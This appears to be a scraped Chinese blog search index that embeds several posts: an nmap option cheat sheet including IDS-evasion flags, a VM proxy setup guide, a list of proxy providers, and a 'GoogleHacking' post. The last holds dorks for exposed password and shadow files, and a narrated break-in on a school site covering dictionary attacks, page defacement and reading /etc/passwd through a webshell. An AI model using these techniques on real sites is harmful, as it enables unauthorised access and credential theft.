&lt;li&gt;-min-parallelism / max-parallelism &lt;numprobes&gt;：探针并行化&lt;/li&gt;
&lt;li&gt;-min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout &lt;time&gt;：指定&lt;/li&gt;
&lt;li&gt;探测往返时间。&lt;/li&gt;
&lt;li&gt;-max-retries &lt;tries&gt;：端口扫描探测器重新传输的大小数量。&lt;/li&gt;
&lt;li&gt;-host-timeout &lt;time&gt;：在这个long&lt;/li&gt;
&lt;li&gt;-scan-delay 之后放弃目标/ -max-scan-delay &lt;time&gt;：调整探针之间的延迟&lt;/li&gt;
&lt;li&gt;-min-rate &lt;number&gt;：&lt;/li&gt;
&lt;li&gt;-max-rate &lt;number&gt;：发送数据包不超过每秒&lt;number&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;防火墙-ids消除和防盗&#34;&gt;防火墙/ IDS消除和防盗：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-f; -mtu &lt;val&gt;：片段数据包（可选w / given MTU）&lt;/li&gt;
&lt;li&gt;-D &amp;lt;decoy1，decoy2 [，ME]，…&amp;gt;：用诱饵隐藏扫描&lt;/li&gt;
&lt;li&gt;-S &amp;lt;IP_Address&amp;gt;：欺骗源地址&lt;/li&gt;
&lt;li&gt;-e &lt;iface&gt;：使用指定的接口&lt;/li&gt;
&lt;li&gt;-g / -source-port &amp;lt;&lt;/li&gt;
&lt;li&gt;portnum &amp;gt;：使用给定的端口号-proxies &amp;lt;url1，[url2]，…&amp;gt;：通过HTTP / SOCKS4代理服务器的中继连接&lt;/li&gt;
&lt;li&gt;-data &amp;lt;十六进制字符串&amp;gt;：将自定义有效内容附加到已发送数据包&lt;/li&gt;
&lt;li&gt;-data-string &lt;string&gt;：将自定义ASCII字符串附加到已发送数据包&lt;/li&gt;
&lt;li&gt;-data-length &lt;num&gt;：将随机数据附加到已发送数据包&lt;/li&gt;
&lt;li&gt;-ip-options &amp;lt;选项&amp;gt;：发送指定ip选项的数据包&lt;/li&gt;
&lt;li&gt;-ttl &lt;val&gt;：设置IP生存时间字段&lt;/li&gt;
&lt;li&gt;-spoof-mac &amp;lt;&lt;/li&gt;
&lt;li&gt;-badsum：发送虚假TCP / UDP / SCTP校验和的数据包&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;output&#34;&gt;OUTPUT&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-oN / -oX / -oS / -oG &lt;file&gt;：分别以正常，XML，s | &amp;lt;rIpt kIddi3&lt;/li&gt;
&lt;li&gt;和Grepable格式输出扫描到给定的文件名。&lt;/li&gt;
&lt;li&gt;-oA &lt;basename&gt;：一次输出三种主要格式&lt;/li&gt;
&lt;li&gt;-v：提高详细级别（使用-vv或更多以获得更大效果）&lt;/li&gt;
&lt;li&gt;-d：提高调试级别（使用-dd或更多以获得更大效果）&lt;/li&gt;
&lt;li&gt;-reason：Display端口处于特定状态的原因&lt;/li&gt;
&lt;li&gt;-open：只显示打开的（或可能打开的）端口&lt;/li&gt;
&lt;li&gt;-packet-trace：显示所有发送和接收的数据包&lt;/li&gt;
&lt;li&gt;-iflist：打印主机接口和路由（用于调试）&lt;/li&gt;
&lt;li&gt;-log-errors：Log错误/警告到正常格式的输出文件&lt;/li&gt;
&lt;li&gt;-append-output：附加到指定的输出文件而不是clobber&lt;/li&gt;
&lt;li&gt;-resume &lt;filename&gt;：恢复中止的扫描&lt;/li&gt;
&lt;li&gt;-stylesheet &amp;lt;path / URL&amp;gt;：XSL样式表将XML输出转换为HTML&lt;/li&gt;
&lt;li&gt;-webxml：Nmap.Org的参考样式表，用于更多可移植的XML&lt;/li&gt;
&lt;li&gt;-no-stylesheet：防止关联XSL样式表w / XML输出&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;misc&#34;&gt;MISC：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-6：启用IPv6扫描&lt;/li&gt;
&lt;li&gt;-A：启用OS检测，版本检测，脚本扫描和traceroute&lt;/li&gt;
&lt;li&gt;-datadir &lt;dirname&gt;：指定自定义Nmap数据文件位置&lt;/li&gt;
&lt;li&gt;-send-eth / -send-ip：使用原始以太网帧进行发送或IP数据包&lt;/li&gt;
&lt;li&gt;-privileged：假设用户具有完全特权&lt;/li&gt;
&lt;li&gt;-unprivileged：假定用户缺少原始套接字权限&lt;/li&gt;
&lt;li&gt;-V：打印版本号&lt;/li&gt;
&lt;li&gt;-h：打印此帮助摘要页面&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;另见&#34;&gt;另见&lt;/h4&gt;
&lt;p&gt;虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;unicornscan&lt;/li&gt;
&lt;li&gt;hping3&lt;/li&gt;
&lt;li&gt;masscan&lt;/li&gt;
&lt;li&gt;amap&lt;/li&gt;
&lt;li&gt;Metasploit scanning module&lt;/li&gt;
&lt;/ul&gt;
">nmap基本使用</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/mac-she-zhi-xu-ni-ji-shi-yong-su-zhu-ji-dai-li/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;前提：mac 本身已经安装 ss，并且可以通过 ss 科学上网（或者 win 也一样）&lt;br&gt;
想要实现：Parallels Desktop 里的虚拟机也想科学上网（或者 win 里安装 vmware 也一样，或者是另一台物理机也是一样的）&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;方法一虚拟机也安装一个-ss-客户端&#34;&gt;方法一：虚拟机也安装一个 ss 客户端&lt;/h3&gt;
&lt;p&gt;对于有窗口的系统，比如你虚拟机里安装的是 win、或者 ubuntu 等，那么再安装一个客户端是很方便的，这就相当于在另一台电脑里使用 ss 客户端，既然 mac 上你会用了，那在其他电脑上也是一样的。&lt;/p&gt;
&lt;p&gt;但是如果虚拟机里是最小化安装的纯命令行的 centos，那么使用客户端可能有一定的麻烦，yum 无法安装，pip 安装的感觉也是 ssserver，并没有客户端，所以客户端还得编译，编译还有很多依赖，编译好还得写对配置文件，很多人都不太清楚这个，所以还是挺麻烦的。&lt;/p&gt;
&lt;h3 id=&#34;方法二虚拟机设置代理到宿主机&#34;&gt;方法二：虚拟机设置代理到宿主机&lt;/h3&gt;
&lt;p&gt;即虚拟机里设置代理到 mac（这里 mac 就是虚拟机的宿主机），让虚拟机通过 mac 的 ss 科学上网，这里如果宿主机换成 win，虚拟机软件换成 vmware 或 virtualbox，它的原理也都是一样的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置方法：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、首先把宿主机的 ss 设置里的 Local Socks5 Listen Address 由原来的&lt;code&gt;127.0.0.1&lt;/code&gt;设置为&lt;code&gt;0.0.0.0&lt;/code&gt;，如果需要通过 HTTP 代理，那么也要把 ss 里的 HTTP 选项打开，并把 HTTP proxy Listen Address 地址由原来的&lt;code&gt;127.0.0.1&lt;/code&gt;设置为&lt;code&gt;0.0.0.0&lt;/code&gt;，这样做表示代理所有 ip，而不只是本机的&lt;code&gt;127.0.0.1&lt;/code&gt;。如果用的是其他科学上网工具，也有些写成 “share over LAN(通过局域网共享)”，如果有这个选项，选上了就表示监听&lt;code&gt;0.0.0.0&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;2、搞清楚虚拟机是通过什么方式联网的，虚拟机连网无非有两种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;桥接&lt;/li&gt;
&lt;li&gt;NAT&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果是桥接连网，那么只要找出宿主机的联网 ip 即可（mac 的话，一般都是 wifi，或者通过转接头插网线的话，那就是转接头对应的 ip）&lt;/p&gt;
&lt;p&gt;如果是 NAT 连网的，那么要找出宿主机中 NAT 网卡的 ip（在 mac 里使用 parallels desktop 虚拟机的话，NAT 网卡一般是 parallels Shared 开头的）&lt;/p&gt;
&lt;p&gt;3、在虚拟机里的&lt;code&gt;~/.bashrc&lt;/code&gt;或&lt;code&gt;~/.zshrc&lt;/code&gt;里，添加以下两句的其中一句：&lt;/p&gt;
&lt;p&gt;一般填入局域网IP即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export ALL_PROXY=SOCKS5://IP:端口
export ALL_PROXY=HTTP://IP:端口
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第一句表示使用 SOCKS5 代理，第二句表示使用 HTTP 代理，ip 就是第 2 步中找到的 ip，端口就是 ss 对应的端口，打开 ss 的设置里就有，一般 ss 有两个端口，一个 socks5 端口，一个 http 端口，找到对应端口填进去即可。&lt;/p&gt;
&lt;p&gt;最后 source 一下配置文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;source ~/.bashrc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者用 zsh shell 的话就是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;source ~/.zshrc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试 ip 是哪里的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl https://ip.cn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果显示的是代理服务器所在地址 (比如美国) 和 ip，那说明代理设置成功。&lt;/p&gt;
&lt;p&gt;然后试试能否访问 google：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl https://www.google.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果是 Windows，可以直接在 cmd 里设用&lt;code&gt;set http_proxy=http://127.0.0.1:1087&lt;/code&gt;，&lt;code&gt;set https_proxy=http://127.0.0.1:1087&lt;/code&gt;，&lt;code&gt;set all_proxy=http://127.0.0.1:1087&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;更好的写法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 设置使用代理
alias setproxy=&amp;quot;export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo &#39;Set proxy successfully&#39;&amp;quot;
# 设置取消使用代理
alias unsetproxy=&amp;quot;unset http_proxy; unset https_proxy; unset all_proxy; echo &#39;Unset proxy successfully&#39;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
">Mac设置虚拟机使用宿主机代理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/googlehacking/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;Google hacker (Google黑客)是利用GOOGLE提供的搜索功能查找黑客们想找到的信息，一般是查找网站后台，网管的个人信息，也可以用来查找某人在网络上的活动&lt;/p&gt;
&lt;p&gt;Google hacker 一般是做为黑客在入侵时的一个手段，在入侵过程中有时需要查找后台的登陆口就需要用到GOOGLE HACKER，有时猜解密码的时候google也是提供查找管理员资料的有效平台&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;常用语法&#34;&gt;常用语法&lt;/h3&gt;
&lt;h4 id=&#34;intext&#34;&gt;intext&lt;/h4&gt;
&lt;p&gt;这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入&lt;code&gt;intext:动漫&lt;/code&gt;，将返回所有在网页正文部分包含”动漫”的网页，&lt;code&gt;allintext:&lt;/code&gt;使用方法和&lt;code&gt;intext&lt;/code&gt;类似&lt;/p&gt;
&lt;h4 id=&#34;intitle&#34;&gt;intitle&lt;/h4&gt;
&lt;p&gt;和intext差不多，搜索网页标题中是否有所要找的字符，例如搜索:&lt;code&gt;intitle:安全天使&lt;/code&gt;，将返回所有网页标题中包含”安全天使”的网页，同理&lt;code&gt;allintitle:&lt;/code&gt;也同&lt;code&gt;intitle&lt;/code&gt;类似&lt;/p&gt;
&lt;h4 id=&#34;cache&#34;&gt;cache&lt;/h4&gt;
&lt;p&gt;搜索google里关于某些内容的缓存，也许能找到一些好东西&lt;/p&gt;
&lt;h4 id=&#34;define&#34;&gt;define&lt;/h4&gt;
&lt;p&gt;搜索某个词语的定义，搜索:&lt;code&gt;define:hacker&lt;/code&gt;，将返回关于hacker的定义&lt;/p&gt;
&lt;h4 id=&#34;filetype&#34;&gt;filetype&lt;/h4&gt;
&lt;p&gt;搜索指定类型的文件，撒网式攻击还是对特定目标进行信息收集都需要用到这个，例如输入:&lt;code&gt;filetype:doc&lt;/code&gt;，将返回所有以doc结尾的文件URL，如果找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富&lt;/p&gt;
&lt;h4 id=&#34;info&#34;&gt;info&lt;/h4&gt;
&lt;p&gt;查找指定站点的一些基本信息&lt;/p&gt;
&lt;h4 id=&#34;inurl&#34;&gt;inurl&lt;/h4&gt;
&lt;p&gt;搜索:&lt;code&gt;inurl:www.123.net&lt;/code&gt;可以返回所有和&lt;code&gt;www.123.net&lt;/code&gt;做了链接的URL&lt;/p&gt;
&lt;h4 id=&#34;site&#34;&gt;site&lt;/h4&gt;
&lt;p&gt;搜索:&lt;code&gt;site:www.123.net&lt;/code&gt;，将返回所有和123.net这个站有关的URL&lt;/p&gt;
&lt;p&gt;还有一些操作符也是很有用的:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;– 把某个字忽略

~ 同意词

. 单一的通配符

“” 精确查询
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;典型用法&#34;&gt;典型用法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;找管理后台地址&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;site:xxx.com intext：管理后台登陆用户名密码系統账号

site:xxx.com inurl: login/admin/manage/manager/adminlogin/system 

site:xxx.com intitle 管理后台登陆
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;找上传类漏洞地址：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;site:xxx.com inurl:file 

site:xxx.com inurl:upload 
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;找注入页面&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;site:xxx.com inurl:php?id=
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;找编辑器页面&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;site:xxx.com inurl:ewebeditor
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;实际应用&#34;&gt;实际应用&lt;/h3&gt;
&lt;p&gt;对于攻击者来说，可能最感兴趣的就是密码文件了，而google正因为其强大的搜索能力往往会把一些敏感信息透露出来，用google搜索以下内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;intitle:”index of” etc

intitle:”Index of” .sh_history

intitle:”Index of” .bash_history

intitle:”index of” passwd

intitle:”index of” people.lst

intitle:”index of” pwd.db

intitle:”index of” etc/shadow

intitle:”index of” spwd

intitle:”index of” master.passwd

intitle:”index of” htpasswd

“# -FrontPage-” inurl:service.pwd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同样可以用google来搜索一些具有漏洞的程序，例如ZeroBoard前段时间发现个文件代码泄露漏洞，我们可以用google来找网上使用这套程序的站点:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;intext:ZeroBoard filetype:php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者使用:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;inurl:　outlogin.php?_zb_path= site:.jp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;phpmyadmin是一套功能强大的数据库操作软件，一些站点由于配置失误，导致可以不使用密码直接对phpmyadmin进行操作，可以用google搜索存在这样漏洞的程序&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;intitle:phpmyadmin intext:Create new database
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以用google来搜索数据库文件，用上一些语法来精确查找能够获得更多东西(access的数据库,mssql、mysql的连接文件等等)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allinurl:bbs data

filetype:mdb inurl:database

filetype:inc conn

inurl:data filetype:mdb

intitle:”index of” data //在一些配置不正确的apache+win32的服务器上经常出现这种情况
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;实战演示&#34;&gt;实战演示&lt;/h3&gt;
&lt;p&gt;利用google完全是可以对一个站点进行信息收集和渗透的，下面用google对特定站点进行一次测试&lt;/p&gt;
&lt;p&gt;首先用google先看这个站点的一些基本情况&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:xxxx.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从返回的信息中，找到几个该校的几个系院的域名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://a1.xxxx.com

http://a2.xxxx.com

http://a3.xxxx.com

http://a4.xxxx.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;顺便ping了一下，应该是在不同的服务器，学校一般都会有不少好的资料&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:xxxx.com filetype:doc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到N个不错的doc。先找找网站的管理后台地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:xxxx.com intext:管理

site:xxxx.com inurl:login

site:xxxx.com intitle:管理
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;超过获得2个管理后台地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://a2.xxxx.com/sys/admin_login.asp

http://a3.xxxx.com:88/_admin/login_in.asp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看看服务器上跑的是什么程序：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:a2.xxxx.com filetype:asp

site:a2.xxxx.com filetype:php

site:a2.xxxx.com filetype:aspx

site:a3.xxxx.com filetype:asp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;a2服务器用的应该是IIS，上面用的是asp的整站程序，还有一个php的论坛&lt;/p&gt;
&lt;p&gt;a3服务器也是IIS，aspx+asp。web程序都应该是自己开发的。有论坛那就看看能不能遇见什么公共的FTP帐号什么的：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:a2.xxxx.com intext:ftp://:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再看看有没有上传一类的漏洞：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:a2.xxxx.com inurl:file

site:a3.xxxx.com inurl:load
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在a2上发现一个上传文件的页面：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://a2.xxxx.com/sys/uploadfile.asp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用IE看了一下，没权限访问。试试注射&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:a2.xxxx.com filetype:asp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一般学校的站点的密码都比较有规律，通常都是域名+电话一类的变形&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;site:xxxx.com //得到N个二级域名

site:xxxx.com intext:@xxxx.com //得到N个邮件地址，还有邮箱的主人的名字什么的

site:xxxx.com intext:电话 //N个电话 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把这些信息做个字典，挂上慢慢跑。过了一段时间就跑出4个帐号，2个是学生会的，1个管理员，还有一个可能是老师的帐号&lt;/p&gt;
&lt;p&gt;google hack其实也都差不多是一些基本语法的灵活运用，或者配合某个脚本漏洞，主要还是靠个人的灵活思维&lt;/p&gt;
&lt;p&gt;对于一些在win上跑 apache的应该多注意一下这方面，一个&lt;code&gt;intitle:index of&lt;/code&gt;就差不多都出来了 &lt;code&gt;echo “召唤” &amp;gt; index.jsp&lt;/code&gt; 现在看看首页，已经被改成: “召唤” 了。&lt;/p&gt;
&lt;p&gt;也可以用WGET上传一个文件上去，然后&lt;code&gt;execute Command输入 cat file &amp;gt; index.html or echo “”&amp;gt; file echo “test” &amp;gt;&amp;gt; file&lt;/code&gt; 这样一条条打出来，站点首页就成功被替换了&lt;/p&gt;
&lt;p&gt;同样的也可以 &lt;code&gt;uname -a;cat /etc/passwd&lt;/code&gt; 不过有点要注意，有些WEBSHELL程序有问题，执行不了的，&lt;/p&gt;
&lt;h4 id=&#34;搜索inc敏感信息&#34;&gt;搜索INC敏感信息&lt;/h4&gt;
&lt;p&gt;在google的搜索框中填入: &lt;code&gt;Code: .org filetype:inc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;例：常用的google关键字： foo1 foo2 (也就是关联，比如搜索xx公司 xx美女)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;operator:foo filetype:123&lt;/code&gt; 类型&lt;/p&gt;
&lt;p&gt;&lt;code&gt;site:foo.com&lt;/code&gt; 相对直接看网站更有意思，可以得到许多意外的信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;intext:foo intitle: fooltitle&lt;/code&gt; 标题 &lt;code&gt;allinurl:foo&lt;/code&gt; 搜索xx网站的所有相关连接。（踩点必备）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;links:foo&lt;/code&gt;不要说就知道是它的相关链接&lt;/p&gt;
&lt;p&gt;&lt;code&gt;allintilte:foo.com&lt;/code&gt; 可以辅助&lt;code&gt;”-” “+”&lt;/code&gt;来调整搜索的精确程度 直接搜索密码：(引号表示为精确搜索)&lt;/p&gt;
&lt;p&gt;可以再延伸到上面的结果里进行二次搜索&lt;/p&gt;
&lt;p&gt;&lt;code&gt;“index of” htpasswd / passwd filetype:xls username password email “ws_ftp.log” “config.php” allinurl:admin mdb service filetype:pwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者某个比如pcanywhere的密码后缀cif等&lt;/p&gt;
&lt;p&gt;再来点更敏感信息 &lt;code&gt;“robots.txt” “Disallow:” filetype:txt inurl:_vti_cnf&lt;/code&gt; (FrontPage的关键索引啦，扫描器的CGI库一般都有)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:”documetation” inurl: 5800(vnc的端口)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者desktop port等多个关键字检索 &lt;code&gt;webmin port 10000 inurl:/admin/login.asp intext:　Powered by GBook365 intitle:”php shell” “Enable stderr” filetype:php&lt;/code&gt; 直接搜索到phpwebshell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;foo.org filetype:inc

ipsec filetype:conf

intilte:”error occurred” ODBC request where (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射

“Dumping data for table” username password

intitle:”Error using Hypernews”

“Server Software”

intitle:”HTTP_USER_AGENT=Googlebot”

“HTTP_USER_ANGET=Googlebot” THS ADMIN

filetype:.doc site:.mil classified 直接搜索军方相关word
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;检查多个关键字：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;intitle:config confixx login password

“mydomain.com” nessus report

“report generated by”

“ipconfig”

“winipconfig”
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;google缓存利用，搜索时候多”选搜索所有网站”&lt;/p&gt;
&lt;p&gt;特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典&lt;/p&gt;
&lt;p&gt;一些技巧集合：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;index.of.password&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;filetype:blt “buddylist”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“access denied for user” “using password”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;intitle:”index of” inurl:ftp (pub | incoming)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“http://:@www” domainname&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;filetype:cnf inurl:_vti_pvt access.cnf&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;auth_user_file.txt&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;allinurl:”//_vti_pvt/” | allinurl:”//_vti_cnf/”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The Master List&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;inurl:”install/install.php”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;allinurl: admin mdb&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;intitle:”welcome.to.squeezebox”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;passlist.txt (a better way)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;intext:””BiTBOARD v2.0″ BiTSHiFTERS Bulletin Board”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“A syntax error has occurred” filetype:ihtml&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;intitle:　Login intext:”RT is ? Copyright”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“# -FrontPage-” inurl:service.pwd&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ext:php program_listing intitle:MythWeb.Program.Listing&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ORA-00921: unexpected end of SQL command&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;intitle:index.of abyss.conf&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
">GoogleHacking</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/SSR提供商/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;自己经常用的一些梯子，且用且珍惜&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;mengdi-cloud&#34;&gt;MENGDI-Cloud&lt;/h3&gt;
&lt;p&gt;现已接入台湾HINET中华电信,香港HKT、WTT、HKBN、HGC、阿里云CN2、俄罗斯伯力、韩国KT、SK、LG、azure、新加坡CN2、美国CN2、香港azure、日本IIJ、软银,高达1Gbps数据传输最大全力保证大陆宽带,旗下站点X-AIR主要运营V2ray加速&lt;/p&gt;
&lt;p&gt;官方网址：https://wan.sc.cn&lt;/p&gt;
&lt;h3 id=&#34;喵帕斯&#34;&gt;喵帕斯&lt;/h3&gt;
&lt;p&gt;极限速度很快，稳定性不错，香港机子比较多&lt;/p&gt;
&lt;p&gt;官网： https://www.喵帕斯.com&lt;/p&gt;
&lt;p&gt;邀请码可私聊bot： https://t.me/duyao_bot&lt;/p&gt;
&lt;h3 id=&#34;rixcloud&#34;&gt;RixCloud&lt;/h3&gt;
&lt;p&gt;全部节点BGP中继阿里云机房（500M/300M/200M） 虽然看起来延迟比直连要高一些，但是实际起速要比直连还快很多，而且稳定&lt;/p&gt;
&lt;p&gt;官网：https://bit.ly/2M7G1Rm&lt;/p&gt;
&lt;h3 id=&#34;ssrcloud&#34;&gt;ssrcloud&lt;/h3&gt;
&lt;p&gt;性价比也很好，部分线路0.1倍率。  180+节点，新增多条BGP线路&lt;/p&gt;
&lt;p&gt;网站：https://bit.ly/2IvnxVW&lt;/p&gt;
&lt;h3 id=&#34;muncloud&#34;&gt;MunCloud&lt;/h3&gt;
&lt;p&gt;新增部分阿里云内网专线。总体来说还算不错的一家，性价比不错。60+节点。&lt;/p&gt;
&lt;p&gt;网站：https://bit.ly/2QOlRdV&lt;/p&gt;
&lt;h3 id=&#34;百草园&#34;&gt;百草园&lt;/h3&gt;
&lt;p&gt;晚高峰测了测，速度还算不错，流量给的也很足&lt;/p&gt;
&lt;p&gt;官网：https://bit.ly/2wDqDkX&lt;/p&gt;
&lt;h3 id=&#34;次元链接&#34;&gt;次元链接&lt;/h3&gt;
&lt;p&gt;也是一家大站了，之前在youtube上见过，人数不少，试了试总体速度还不错，性价比还可以。总节点数90+&lt;/p&gt;
&lt;p&gt;官网：https://k0.pw/vrrno1&lt;/p&gt;
&lt;h3 id=&#34;swcloud星愿云&#34;&gt;SWCloud星愿云&lt;/h3&gt;
&lt;p&gt;试速度还可以，性价比也OK。总节点数50+&lt;/p&gt;
&lt;p&gt;官网： https://bit.ly/2MN614G&lt;/p&gt;
&lt;h3 id=&#34;ctcloud&#34;&gt;CTCloud&lt;/h3&gt;
&lt;p&gt;晚高峰的时候测过几天速，还不错，价钱也不贵，性价比还可以，线路大概在40条&lt;/p&gt;
&lt;p&gt;官网：https://bit.ly/2K25mcR&lt;/p&gt;
&lt;h3 id=&#34;stc-server&#34;&gt;STC-server&lt;/h3&gt;
&lt;p&gt;不过速度还不错，性价比不错&lt;/p&gt;
&lt;p&gt;官网：https://bit.ly/2IsvRFI&lt;/p&gt;
&lt;h3 id=&#34;bighead&#34;&gt;BigHead&lt;/h3&gt;
&lt;p&gt;一家运营快一年的机场，之前是公益机场，现在主打AZ节点&lt;/p&gt;
&lt;p&gt;官网：https://bit.ly/2VPGjM9&lt;/p&gt;
&lt;p&gt;TG： https://t.me/BigHeadSSRV2ray&lt;/p&gt;
&lt;h3 id=&#34;catchflying&#34;&gt;Catchflying&lt;/h3&gt;
&lt;p&gt;速度还不错。35+节点&lt;/p&gt;
&lt;p&gt;官网：https://bit.ly/2F7O3DH&lt;/p&gt;
